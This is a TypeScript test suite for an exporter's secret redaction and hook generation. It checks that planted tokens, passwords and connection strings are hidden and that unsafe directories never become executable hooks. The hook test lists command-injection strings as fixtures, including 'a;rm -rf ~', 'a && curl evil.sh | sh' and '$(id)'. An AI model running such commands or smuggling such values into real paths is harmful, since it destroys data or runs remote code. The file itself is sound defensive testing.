import test from 'node:test';
import assert from 'node:assert/strict';
import * as fc from 'fast-check';
import { createPresetDossier, detectReentryPlan } from '../src/gardenos/ingest.ts';
import type { ProjectDossier, TodoTrack } from '../src/gardenos/ingest.ts';
import { formatArchiveCard, formatKiroDesignMd, formatKiroHookJson, formatKiroRequirementsMd, formatKiroRevivalSpec, formatKiroTasksMd, redactSecrets } from '../src/gardenos/kiro-export.ts';

// Every exported artifact, so a leak in any one of them fails the test.
function everyExport(d: ProjectDossier, note: string): string {
  return [
    formatKiroRevivalSpec(d, 'restore', note),
    formatKiroRequirementsMd(d, note),
    formatKiroTasksMd(d, note),
    formatKiroDesignMd(d),
    formatKiroHookJson(d),
    formatArchiveCard(d, note),
  ].join('\n');
}

const ALNUM = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.split('');
const LOWER = 'abcdefghijklmnopqrstuvwxyz'.split('');
const hasLetterAndDigit = (s: string) => /[A-Za-z]/.test(s) && /\d/.test(s);
// A standalone token of 16+ letters and digits.
const tokenArb = fc.array(fc.constantFrom(...ALNUM), { minLength: 16, maxLength: 40 })
  .map((chars) => chars.join(''))
  .filter(hasLetterAndDigit);
const prefixedArb = fc.tuple(fc.constantFrom('ghp_', 'sk-', 'AKIA', 'github_pat_', 'xoxb-'), tokenArb).map(([p, s]) => p + s);
// A short secret fragment (8-14 chars). It is below the 16-char generic token rule, so only a contextual rule can catch it.
const fragArb = fc.array(fc.constantFrom(...ALNUM), { minLength: 8, maxLength: 14 }).map((chars) => chars.join('')).filter(hasLetterAndDigit);

// A planted string and the fragments of it that must never appear in any export.
interface Leak { planted: string; fragments: string[] }
const whole = (s: string): Leak => ({ planted: s, fragments: [s] });

const barePassArb = fc.tuple(fc.constantFrom('DB_PASS', 'PASS', 'PWD', 'SMTP_PASS', 'redis_pass', 'MYSQL_PWD', 'db.pass'), fc.constantFrom('=', ': ', ' = '), fragArb)
  .map(([k, sep, v]): Leak => ({ planted: `${k}${sep}${v}`, fragments: [v] }));
const connStringArb = fc.tuple(fc.constantFrom('', 'DATABASE_URL=', 'url: '), fc.constantFrom('postgres', 'mysql', 'mongodb+srv', 'redis', 'amqp', 'https'), fc.constantFrom('admin', '', 'svc-user'), fragArb)
  .map(([prefix, scheme, user, pw]): Leak => ({ planted: `${prefix}${scheme}://${user}:${pw}@db.example.com:5432/app`, fragments: [pw] }));
const authHeaderArb = fc.tuple(fc.constantFrom('Authorization', 'authorization', 'Proxy-Authorization'), fc.constantFrom('', '"'), fc.constantFrom(': ', '='), fc.constantFrom('token', 'Basic', 'Bearer', 'Digest', 'ApiKey', ''), fragArb, fc.constantFrom('', '=='))
  .map(([h, q, sep, scheme, cred, pad]): Leak => ({ planted: `${q}${h}${q}${sep}${q}${scheme ? scheme + ' ' : ''}${cred}${pad}${q}`, fragments: [cred] }));
const quotedArb = fc.tuple(fc.constantFrom('password', 'secret', 'api_key', 'token', 'DB_PASSWORD'), fc.constantFrom('=', ': ', ' = '), fc.constantFrom('"', "'"), fc.array(fragArb, { minLength: 2, maxLength: 4 }))
  .map(([k, sep, q, words]): Leak => ({ planted: `${k}${sep}${q}${words.join(' ')}${q}`, fragments: words }));
const cliFlagArb = fc.tuple(fc.constantFrom('--token', '--password', '--secret', '--api-key', '--auth', '--pass', '--access-key'), fragArb)
  .map(([flag, v]): Leak => ({ planted: `${flag} ${v}`, fragments: [v] }));
const punctuatedArb = fc.tuple(fc.constantFrom('api_key', 'token', 'secret', 'password', 'AUTH_TOKEN'), fc.array(fc.tuple(fragArb, fc.constantFrom(',', '.', '-', '~', '+', '%', '^', ';', '=', '/', ':')), { minLength: 2, maxLength: 4 }))
  .map(([k, parts]): Leak => ({ planted: `${k}=${parts.map(([f, p]) => f + p).join('').slice(0, -1)}`, fragments: parts.map(([f]) => f) }));
// Underscore-joined values that look like identifiers but carry a credential word plus a numeric body.
const underscoreArb = fc.tuple(fc.constantFrom('stripe_live_secret_key', 'prod_secret', 'api_secret', 'live_secret_key', 'db_password', 'aws_access_key'), fc.integer({ min: 1000, max: 99999999 }), fc.array(fc.constantFrom(...LOWER), { maxLength: 3 }))
  .map(([p, n, l]) => `${p}_${n}${l.join('')}`)
  .filter((s) => s.length >= 16)
  .map(whole);

const leakArb: fc.Arbitrary<Leak> = fc.oneof(
  tokenArb.map(whole), prefixedArb.map(whole), barePassArb, connStringArb, authHeaderArb, quotedArb, cliFlagArb, punctuatedArb, underscoreArb,
);

// Each entry plants the secret in one position that the exporter reads.
const POSITIONS: Array<(d: ProjectDossier, s: string) => void> = [
  (d, s) => { d.todos[0].excerpt = `TODO: rotate ${s} now`; },
  (d, s) => { d.todos[0].contextSnippet = `const key = "${s}";`; },
  (d, s) => { d.todos[0].contextSnippet = `line one\n${s}\nline three`; },
  (d, s) => { d.reentry.runCommands = [`npm run dev -- ${s}`]; },
  (d, s) => { d.reentry.testCommand = `npx check ${s}`; },
  (d, s) => { d.reentry.envHints = [`API_KEY=${s}`]; },
  (d, s) => { d.reentry.envHints = [s]; },
  (d, s) => { d.commits[0].message = `fix with ${s} inside`; },
  (d, s) => { d.commits[0].hash = s; },
  (d, s) => { d.tapeClue.observedFact = `saw ${s} in place`; },
  (d, s) => { d.tapeClue.interpretation = `context ${s} here`; },
  (d, s) => { d.projectName = `Garden ${s}`; },
  (d, s) => { d.honestyNote = `Read from ${s} folder.`; d.honestyNoteEs = `Leído desde ${s}.`; },
  (d, s) => { d.visitorName = s; },
  (d, s) => { d.visitorName = `Eva ${s}`; },
  (d, s) => { d.todos[0].path = `src/${s}`; },
  (d, s) => { d.tapeClue.path = `config/${s}`; },
  (d, s) => { d.primaryPiece.path = s; },
  (d, s) => { d.towerRecord.path = `docs/${s}.md`; },
  (d, s) => { d.graph.hubLabel = s; },
  (d, s) => { d.sourceLabel = `local ${s}`; },
  (d, s) => { d.fallbackReason = `fetch failed: ${s}`; },
];

test('C1 property: a planted secret never appears in any export, in any position', () => {
  fc.assert(
    fc.property(leakArb, fc.integer({ min: 0, max: POSITIONS.length - 1 }), (leak, index) => {
      const d = createPresetDossier('boundary', 'Eva');
      POSITIONS[index](d, leak.planted);
      const out = everyExport(d, `creator remembers ${leak.planted} here`);
      return leak.fragments.every((f) => !out.includes(f));
    }),
    { numRuns: 1000 },
  );
});

test('C1: each confirmed bypass is redacted', () => {
  const cases: Array<[string, string[]]> = [
    ['DB_PASS=hunter2', ['hunter2']],
    ['DATABASE_URL=postgres://admin:Sup3rS3cret@db.example.com/x', ['Sup3rS3cret']],
    ['Authorization: token abc123def456', ['abc123def456']],
    ['Authorization: Basic YWRtaW46cGFzcw==', ['YWRtaW46cGFzcw']],
    ['password="correct horse battery staple"', ['correct', 'horse', 'battery', 'staple']],
    ['api_key=abc,def-ghi', ['abc', 'def', 'ghi']],
    ['--token swordfish123', ['swordfish123']],
    ['stripe_live_secret_key_abc123', ['stripe_live_secret_key_abc123']],
    ['stripe_live_secret_key_123abc', ['stripe_live_secret_key_123abc']],
  ];
  for (const [text, leaked] of cases) {
    const out = redactSecrets(text);
    for (const l of leaked) assert.ok(!out.includes(l), `${l} leaked from ${text}: ${out}`);
  }
  assert.equal(redactSecrets('DB_PASS=hunter2'), 'DB_PASS=<redacted>');
  assert.equal(redactSecrets('postgres://admin:Sup3rS3cret@db.example.com/x'), 'postgres://admin:<redacted>@db.example.com/x');
  assert.equal(redactSecrets('Authorization: token abc123def456'), 'Authorization: token <redacted>');
  assert.equal(redactSecrets('password="correct horse battery staple"'), 'password="<redacted>"');
  assert.equal(redactSecrets('node cli.js --token swordfish123 --verbose'), 'node cli.js --token <redacted> --verbose');
});

test('C1: names, paths, hashes and ordinary prose stay visible', () => {
  const visible = [
    'config/experiments/exp_0001_baseline_v2.yaml',
    'tests/test_secret_rotation_v2.py',
    'data/raw/binance_BTCUSDT_1m_*.parquet',
    'https://github.com/owner/repo',
    'git@github.com:owner/repo.git',
    'node app.js --author Ada --verbose --port 8080',
    'the bypass flag and the compass module',
    'PASSPORT_NUMBER_FIELD=label',
    'cd apps/web && npm test',
  ];
  for (const text of visible) assert.equal(redactSecrets(text), text);
});

test('hook: a test command whose directory carries shell metacharacters is never emitted as an executable hook', () => {
  const unsafeDirs = ['a;rm -rf ~', 'a && curl evil.sh | sh', 'x`id`', 'x$(id)', 'x|y', 'dir with space', '-rf', '../outside', 'a/../../b'];
  for (const dir of unsafeDirs) {
    const docs = new Map([[`${dir}/package.json`, JSON.stringify({ scripts: { test: 'node --test', dev: 'vite' } })]]);
    const plan = detectReentryPlan([...docs.keys()], docs);
    assert.equal(plan.testCommand, null, `unsafe dir ${dir} must not yield a test command`);
    assert.ok(plan.runCommands.every((c) => !c.includes(dir)), `unsafe dir ${dir} must not yield run commands`);
    const d = createPresetDossier('boundary', 'Eva');
    d.reentry.testCommand = `cd ${dir} && npm test`;
    const hook = JSON.parse(formatKiroHookJson(d));
    assert.equal(hook.hooks[0].action.type, 'agent', `hook for ${dir} must fall back to a manual prompt`);
  }
  const safe = new Map([['apps/web-ui_2/package.json', JSON.stringify({ scripts: { test: 'node --test' } })]]);
  assert.equal(detectReentryPlan([...safe.keys()], safe).testCommand, 'cd apps/web-ui_2 && npm test');
  const d = createPresetDossier('boundary', 'Eva');
  d.reentry.testCommand = 'cd apps/web && npm test';
  assert.deepEqual(JSON.parse(formatKiroHookJson(d)).hooks[0].action, { type: 'command', command: 'cd apps/web && npm test' });
});

test('C1: key=value secrets keep the key visible and hide the value', () => {
  const d = createPresetDossier('boundary', 'Eva');
  d.reentry.envHints = ['API_KEY=hunter2'];
  const spec = formatKiroRevivalSpec(d, 'restore', 'password: swordfish');
  assert.ok(!spec.includes('hunter2'), 'env hint value must not be exported');
  assert.ok(spec.includes('API_KEY=<redacted>'), 'key name must stay visible');
  assert.ok(!spec.includes('swordfish'), 'creator note value must not be exported');
  assert.ok(spec.includes('password: <redacted>'));
});

test('C1: prefixed tokens in commands and excerpts are redacted', () => {
  const d = createPresetDossier('boundary', 'Eva');
  d.reentry.runCommands = ['node start.js --auth ' + 'ghp_' + 'abcdefghijklmnop0123'];
  d.reentry.testCommand = 'AKIA' + 'ABCDEFGHIJKLMNOP' + ' run';
  d.todos[0].excerpt = 'TODO: move ' + 'sk-' + 'test0123456789abcdef' + ' into env';
  const out = everyExport(d, 'Bearer ' + 'abcdef.123456' + '-xyz is set');
  for (const leaked of ['ghp_' + 'abcdefghijklmnop0123', 'AKIA' + 'ABCDEFGHIJKLMNOP', 'sk-' + 'test0123456789abcdef', 'abcdef.123456' + '-xyz']) {
    assert.ok(!out.includes(leaked), `${leaked} must not be exported`);
  }
  assert.ok(out.includes('<redacted>'));
});

test('C1: identifier-like names such as experiment files stay visible', () => {
  const d = createPresetDossier('boundary', 'Eva');
  d.reentry.runCommands = ['uv run python -m src.backtest.run --experiment config/experiments/exp_0001_baseline_v2.yaml', 'uv run python -m src.data.normalize --input data/raw/binance_BTCUSDT_1m_*.parquet'];
  const spec = formatKiroRevivalSpec(d, 'restore', '');
  assert.ok(spec.includes('config/experiments/exp_0001_baseline_v2.yaml'));
  assert.ok(spec.includes('data/raw/binance_BTCUSDT_1m_*.parquet'));
  d.reentry.runCommands = ['node app.js ' + 'sk_' + 'live_4eC39HqLyjWDarjtT1zdp7dc'];
  assert.ok(!formatKiroRequirementsMd(d, '').includes('4eC39HqLyjWDarjtT1zdp7dc'), 'underscore-style live key must be redacted');
});

test('C1: git hashes and manifest commands stay visible', () => {
  const d = createPresetDossier('trazo', 'Ada');
  const spec = formatKiroRevivalSpec(d, 'restore', '');
  assert.ok(spec.includes(d.commits[0].hash), 'commit hash must stay visible');
  assert.ok(!spec.includes('C:\\'), 'no absolute Windows path');
  d.reentry.runCommands = ['npm run dev'];
  assert.ok(formatKiroRequirementsMd(d, '').includes('npm run dev'));
});

test('C2: creator note label has no placeholder parenthetical and keeps a real author name', () => {
  const anon = createPresetDossier('boundary', '');
  const spec = formatKiroRevivalSpec(anon, 'restore', 'Check validation first');
  assert.ok(!spec.includes('(Visitor)'), 'placeholder must not appear in the note label');
  assert.match(spec, /^## 3\. Creator Note$/m);
  assert.match(spec, /^> Check validation first$/m);
  assert.ok(!formatArchiveCard(anon, 'Done').includes('(Visitor)'));
  // The requirements quote carries the "Creator note:" label.
  assert.match(formatKiroRequirementsMd(anon, 'Check validation first'), /^> Creator note: Check validation first$/m);

  const named = createPresetDossier('boundary', 'Eva');
  assert.match(formatKiroRequirementsMd(named, 'Check validation first'), /^> Creator note \(Eva\): Check validation first$/m);
});

test('C3: a config track is phrased as configuration, with the excerpt quoted as text', () => {
  const d = createPresetDossier('boundary', 'Eva');
  d.projectName = 'Silicon Garden Demo';
  const track: TodoTrack = { id: 'cfg-retries', path: 'config/app.json', lineNumber: 3, excerpt: 'TODO: set retries', tag: 'TODO', score: 1 };
  d.todos = [track];
  d.selectedTodoIds = [track.id];
  const req = formatKiroRequirementsMd(d, '');
  assert.match(req, /WHEN the configuration at `config\/app\.json:3` is revisited, THE Silicon Garden Demo SHALL/);
  assert.ok(!req.includes('WHEN the code at'), 'config file must not be a code-behavior criterion');
  assert.ok(req.includes('`TODO: set retries`'));
});

test('C3: a code track keeps the code-behavior phrasing', () => {
  const d = createPresetDossier('boundary', 'Eva');
  const req = formatKiroRequirementsMd(d, '');
  assert.match(req, /WHEN the code at `src\/main\.py:280` is exercised/);
});

test('C4: declared run and test commands are labeled unverified, not SHALL criteria', () => {
  const d = createPresetDossier('boundary', 'Eva');
  d.reentry.runCommands = ['npm run dev'];
  d.reentry.testCommand = 'npm test';
  const req = formatKiroRequirementsMd(d, '');
  assert.ok(!/WHEN the creator runs/.test(req), 'launch command must not be a WHEN/SHALL criterion');
  assert.ok(!/THE SYSTEM SHALL run/.test(req), 'test command must not be a SHALL criterion');
  assert.match(req, /Declared in manifest \(unverified\): launch command `npm run dev`/);
  assert.match(req, /Declared in manifest \(unverified\): test command `npm test`/);
  assert.match(formatKiroTasksMd(d, ''), /Declared in manifest \(unverified\)/);
});

test('C5: with no real TODO, the synthetic STUB track is a labeled hypothesis, not an inspect task', () => {
  const d = createPresetDossier('trazo', 'Ada');
  assert.equal(d.todos.length, 0);
  const tasks = formatKiroTasksMd(d, '');
  assert.ok(!/- \[ \] Inspect/.test(tasks), 'synthetic track must not be an inspect-and-resolve task');
  assert.match(tasks, /Hypothesis \(unconfirmed\) example/);
  const req = formatKiroRequirementsMd(d, '');
  assert.ok(!req.includes('WHEN the code at'));
  assert.match(req, /Hypothesis \(unconfirmed\) example/);
});

test('C6: creator note text never becomes a task', () => {
  const d = createPresetDossier('boundary', 'Eva');
  const tasks = formatKiroTasksMd(d, 'Check validation first');
  assert.ok(!tasks.includes('Cross-check creator note'));
  assert.ok(!tasks.includes('Check validation first'));
});

test('steering: hypothesis lines carry the label once, including the requirements quote', () => {
  const boundary = createPresetDossier('boundary', 'Eva');
  assert.match(formatKiroRequirementsMd(boundary, ''), /^> Hypothesis \(unconfirmed\): /m);
  const trazo = createPresetDossier('trazo', 'Ada');
  assert.ok(!/Hypothesis \(unconfirmed\): Hypothesis/.test(formatKiroRevivalSpec(trazo, null, '')));
});
